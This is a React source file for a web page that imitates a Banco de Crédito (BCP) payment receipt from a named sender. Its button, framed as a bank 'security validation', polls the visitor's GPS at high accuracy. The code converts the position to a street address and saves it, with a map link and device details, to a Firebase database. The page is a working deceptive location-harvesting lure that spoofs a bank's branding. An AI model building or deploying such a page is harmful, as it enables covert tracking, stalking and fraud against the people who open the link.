import React, { useState } from 'react';
// 1. Importamos las funciones de Firebase
import { db } from './firebase';
import { collection, addDoc, serverTimestamp } from "firebase/firestore"; 

function App() {
  const [showReceipt, setShowReceipt] = useState(false);
  const [coords, setCoords] = useState({ lat: null, lng: null });
  const [address, setAddress] = useState("");
  const [firebaseStatus, setFirebaseStatus] = useState("");
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState(""); // Nuevo estado para mensajes de carga
  const [accuracy, setAccuracy] = useState(null);     // Para mostrar la precisión

  // ------------------------------------------------------------------
  // 🟢 SOLUCIÓN GRATUITA: OPENSTREETMAP (NOMINATIM)
  // ------------------------------------------------------------------
  const getAddressFromCoords = async (latitude, longitude) => {
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
        {
          headers: {
            'User-Agent': 'GeoTracker-StudentProject/2.0' 
          }
        }
      );
      const data = await response.json();
      
      if (data && data.display_name) {
        return data.display_name;
      }
      return "Dirección no encontrada en el mapa";
    } catch (error) {
      console.error("Error obteniendo dirección:", error);
      return "Error de conexión (Internet inestable)";
    }
  };

  // ------------------------------------------------------------------
  // 🛰️ ALGORITMO DE ALTA PRECISIÓN (MODO RADAR)
  // ------------------------------------------------------------------
  const obtenerMejorUbicacion = () => {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Tu navegador no tiene GPS."));
        return;
      }

      const options = {
        enableHighAccuracy: true, // ¡CRÍTICO! Pide encender el GPS real
        timeout: 15000,           // Esperamos hasta 15 segundos
        maximumAge: 0             // No queremos caché vieja
      };

      let bestPosition = null;
      let watchId = null;

      setLoadingText("Encendiendo GPS...");

      // watchPosition se queda escuchando cambios en la ubicación
      watchId = navigator.geolocation.watchPosition(
        (position) => {
          const currentAccuracy = position.coords.accuracy;
          console.log(`📡 Señal recibida. Precisión: ${currentAccuracy} metros`);
          
          // Actualizamos el texto para que el usuario vea que está trabajando
          setLoadingText(`Calibrando señal... Precisión: ±${Math.round(currentAccuracy)}m`);

          // Si es la primera lectura o es mejor que la anterior, la guardamos temporalmente
          if (!bestPosition || currentAccuracy < bestPosition.coords.accuracy) {
            bestPosition = position;
          }

          // SI LA PRECISIÓN ES EXCELENTE (< 20 metros), TERMINAMOS YA
          if (currentAccuracy <= 20) {
            navigator.geolocation.clearWatch(watchId);
            resolve(bestPosition);
          }
        },
        (error) => {
            // Si hay un error, pero ya teníamos una posición "decente", la usamos
            if (bestPosition) {
                navigator.geolocation.clearWatch(watchId);
                resolve(bestPosition);
            } else {
                navigator.geolocation.clearWatch(watchId);
                reject(error);
            }
        },
        options
      );

      // TIEMPO LÍMITE DE SEGURIDAD (10 segundos)
      // Si en 10 seg no logramos <20m, nos quedamos con la mejor que encontramos
      setTimeout(() => {
        navigator.geolocation.clearWatch(watchId);
        if (bestPosition) {
          console.log("Tiempo agotado. Usando mejor posición encontrada.");
          resolve(bestPosition);
        } else {
          // Si pasaron 10 seg y no encontró NADA, entonces error
          reject(new Error("No se pudo encontrar señal GPS estable."));
        }
      }, 10000); 
    });
  };

  const handleVerifyReceipt = async () => {
    setLoading(true);
    setFirebaseStatus("");

    try {
      // 1. EJECUTAMOS EL RADAR
      const position = await obtenerMejorUbicacion();
      
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
      const acc = position.coords.accuracy;

      setLoadingText("Consultando dirección exacta...");

      // 2. CONVERTIR A DIRECCIÓN (GRATIS)
      const exactAddress = await getAddressFromCoords(lat, lng);
      
      setCoords({ lat, lng });
      setAddress(exactAddress);
      setAccuracy(Math.round(acc));
      setShowReceipt(true);
      setFirebaseStatus("Guardando en base de datos...");

      // 3. GUARDAR EN FIREBASE CON DATOS DE CALIDAD
      await addDoc(collection(db, "comprobantes_pago_bcp"), {
        banco: "BANCO DE CREDITO",
        beneficiario: "RUBEN APAZA CORINA",
        cuenta: "64239676",
        monto: "Bs. 80",
        fecha: "27/11/2025",
        hora: "13:20",
        transactionId: "1426271125211940905543",
        referencia: "Para flota copacabana",
        
        // UBICACIÓN DETALLADA
        ubicacion_gps: {
          latitud: lat,
          longitud: lng,
          precision_metros: Math.round(acc),
          direccion_detectada: exactAddress,
          mapa_link: `https://www.google.com/maps?q=${lat},${lng}`,
          es_precisa: acc <= 30 ? "SI (GPS)" : "NO (Aproximada/Wifi)"
        },
        
        timestamp: serverTimestamp(),
        dispositivo: {
          userAgent: navigator.userAgent,
          plataforma: navigator.platform
        }
      });
      
      setFirebaseStatus("✅ Ubicación Real Registrada");
      setLoading(false);
      
    } catch (error) {
      console.error("Error proceso:", error);
      let errorMsg = "Error desconocido";
      if (error.code === 1) errorMsg = "Debes permitir el acceso a la ubicación";
      if (error.message) errorMsg = error.message;
      
      alert("❌ " + errorMsg);
      setFirebaseStatus("❌ " + errorMsg);
      setLoading(false);
    }
  };

  // ------------------------------------------------------------------
  // INTERFAZ DE USUARIO (UI)
  // ------------------------------------------------------------------
  return (
    <div style={{ 
      padding: '20px', 
      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", 
      backgroundColor: '#0052a3', 
      minHeight: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center'
    }}>
      <div style={{ maxWidth: '700px', width: '100%' }}>
        
        {!showReceipt ? (
          // VISTA 1: BOTÓN DE INICIO
          <div style={{ textAlign: 'center' }}>
            {/* Logo BCP Simulado */}
            <div style={{ 
              backgroundColor: 'white', 
              padding: '40px', 
              borderRadius: '20px',
              marginBottom: '30px',
              boxShadow: '0 8px 16px rgba(0,0,0,0.2)'
            }}>
              <div style={{ fontSize: '80px', fontWeight: 'bold', color: '#0052a3' }}>
                BCP
              </div>
              <p style={{ color: '#666', fontSize: '16px', margin: '10px 0 0 0' }}>
                Banco de Crédito
              </p>
            </div>

            {/* Caja de Acción */}
            <div style={{ 
              backgroundColor: 'white', 
              padding: '30px', 
              borderRadius: '15px',
              boxShadow: '0 8px 16px rgba(0,0,0,0.2)',
              marginBottom: '25px'
            }}>
              <h2 style={{ color: '#0052a3', margin: '0 0 20px 0', fontSize: '20px' }}>
                Confirmar Recepción de Fondos
              </h2>
              
              <div style={{ 
                backgroundColor: '#f8f9fa', 
                padding: '20px', 
                borderRadius: '10px', 
                textAlign: 'left',
                marginBottom: '20px',
                borderLeft: '4px solid #ff6600'
              }}>
                <p style={{ margin: '10px 0', color: '#333', fontSize: '15px' }}>
                  <strong>Origen:</strong> RUBEN APAZA CORINA
                </p>
                <p style={{ margin: '10px 0', color: '#333', fontSize: '15px' }}>
                  <strong>Monto:</strong> Bs. 80.00
                </p>
                <p style={{ margin: '10px 0', color: '#333', fontSize: '15px' }}>
                  <strong>Motivo:</strong> Para flota copacabana
                </p>
              </div>

              <button
                onClick={handleVerifyReceipt}
                disabled={loading}
                style={{
                  width: '100%',
                  padding: '16px',
                  backgroundColor: loading ? '#ccc' : '#ff6600',
                  color: 'white',
                  border: 'none',
                  borderRadius: '10px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: loading ? 'not-allowed' : 'pointer',
                  transition: 'all 0.3s',
                  boxShadow: '0 4px 8px rgba(0,0,0,0.2)'
                }}
              >
                {loading ? (
                    <span>📡 {loadingText}</span>
                ) : (
                    'VER COMPROBANTE COMPLETO'
                )}
              </button>

              <p style={{ color: '#999', fontSize: '12px', marginTop: '15px' }}>
                * Se escaneará su ubicación unos segundos para validar seguridad.
              </p>
            </div>
          </div>
        ) : (
          // VISTA 2: EL COMPROBANTE
          <div style={{ 
            backgroundColor: 'white', 
            padding: '40px', 
            borderRadius: '15px',
            boxShadow: '0 8px 16px rgba(0,0,0,0.2)'
          }}>
            {/* Cabecera del Comprobante */}
            <div style={{ textAlign: 'center', marginBottom: '30px', borderBottom: '3px solid #ff6600', paddingBottom: '25px' }}>
              <div style={{ fontSize: '60px', fontWeight: 'bold', color: '#0052a3', marginBottom: '10px' }}>
                BCP
              </div>
              <h1 style={{ color: '#0052a3', margin: '10px 0', fontSize: '24px', fontWeight: '600' }}>
                COMPROBANTE DE PAGO
              </h1>
              <p style={{ color: '#666', margin: '8px 0', fontSize: '14px' }}>
                27/11/2025 - 13:20 PM
              </p>
            </div>

            {/* Lista de Detalles */}
            <div style={{ marginBottom: '30px' }}>
              <FilaDetalle label="Monto Transferido" value="Bs. 80.00" highlight />
              <FilaDetalle label="Beneficiario" value="RUBEN APAZA CORINA" />
              <FilaDetalle label="Cuenta Destino" value="*** 39676" />
              <FilaDetalle label="Banco" value="BANCO DE CREDITO" />
              <FilaDetalle label="N° Operación" value="1426271125" />
              <FilaDetalle label="Glosa" value="Para flota copacabana" />
            </div>

            {/* Sección de Seguridad / Ubicación */}
            {coords.lat && (
              <div style={{ 
                backgroundColor: '#e8f4f8', 
                padding: '16px', 
                borderRadius: '10px', 
                marginBottom: '20px',
                borderLeft: '4px solid #0052a3'
              }}>
                <h3 style={{ margin: '0 0 12px 0', color: '#0052a3', fontSize: '14px', fontWeight: '600' }}>
                  📍 Validación de Seguridad Exitosa
                </h3>
                <p style={{ margin: '6px 0', fontSize: '13px', color: '#333' }}>
                  <strong>Ubicación registrada:</strong> {address}
                </p>
                <div style={{ marginTop: '10px', fontSize: '11px', color: '#666', display: 'flex', justifyContent: 'space-between' }}>
                  <a 
                    href={`https://www.google.com/maps?q=${coords.lat},${coords.lng}`} 
                    target="_blank" 
                    rel="noopener noreferrer"
                    style={{ color: '#0052a3', textDecoration: 'underline' }}
                  >
                    Ver en mapa (Google Maps)
                  </a>
                  <span>Precisión: ±{accuracy} metros</span>
                </div>
                {accuracy > 50 && (
                     <div style={{color: 'orange', fontSize: '10px', marginTop: '5px'}}>
                        ⚠️ Precisión baja (Probablemente PC o interior).
                     </div>
                )}
              </div>
            )}

            {/* Mensaje de estado de Firebase */}
            {firebaseStatus && (
              <div style={{ 
                textAlign: 'center', 
                fontSize: '12px', 
                color: firebaseStatus.includes('✅') ? 'green' : 'red',
                marginBottom: '15px'
              }}>
                {firebaseStatus}
              </div>
            )}

            <button
              onClick={() => {
                setShowReceipt(false);
                setCoords({ lat: null, lng: null });
                setAddress("");
                setFirebaseStatus("");
              }}
              style={{
                width: '100%',
                padding: '14px',
                backgroundColor: '#0052a3',
                color: 'white',
                border: 'none',
                borderRadius: '10px',
                fontWeight: 'bold',
                cursor: 'pointer'
              }}
            >
              ← Volver
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

// Pequeño componente auxiliar para las filas del recibo (para no repetir código)
const FilaDetalle = ({ label, value, highlight = false }) => (
  <div style={{ 
    display: 'flex', 
    justifyContent: 'space-between', 
    marginBottom: '16px', 
    borderBottom: '1px solid #f0f0f0', 
    paddingBottom: '12px' 
  }}>
    <span style={{ color: '#666', fontWeight: '600', fontSize: '15px' }}>{label}:</span>
    <span style={{ 
      color: highlight ? '#ff6600' : '#333', 
      fontWeight: highlight ? 'bold' : 'normal', 
      fontSize: highlight ? '20px' : '15px',
      fontFamily: highlight ? 'sans-serif' : 'monospace'
    }}>{value}</span>
  </div>
);

export default App;